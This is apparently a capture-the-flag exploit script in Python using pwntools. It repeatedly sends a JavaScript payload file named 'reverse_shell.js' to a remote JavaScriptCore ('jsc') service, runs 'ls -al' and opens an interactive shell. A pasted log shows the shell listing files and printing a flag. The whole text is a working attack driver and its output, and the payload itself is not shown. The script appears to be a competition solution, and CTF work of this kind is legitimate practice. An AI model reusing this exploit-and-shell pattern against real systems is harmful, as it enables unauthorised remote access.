from pwn import *

ans = open('reverse_shell.js').read()
while True:
    r= remote('110.10.147.110', 17423)
#    r = process('./jsc')
#    pause()
    r.sendline(ans)
    sleep(0.3)
#    sleep(2)
    try:
        r.sendline('ls -al ')
        r.recv()
        r.interactive()
    except EOFError:
        r.close()
    r.close()


'''
[*] Interrupted
[+] Opening connection to 110.10.147.110 on port 17423: Done
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$
[*] Interrupted
[+] Opening connection to 110.10.147.110 on port 17423: Done
[*] Switching to interactive mode
total 268
drwxr-xr-x 1 root guest   4096 Jan 26 10:27 .
drw-r----x 1 root root    4096 Jan 26 10:22 ..
-rw-r----- 1 root guest     39 Jan 26 08:50 flag
-rwxr-x--- 1 root guest 258904 Jan 14 16:59 jsc
$ cat flag
flag{4240a8444fe8734044fca90700b3ade2}
[*] Got EOF while reading in interactive
'''

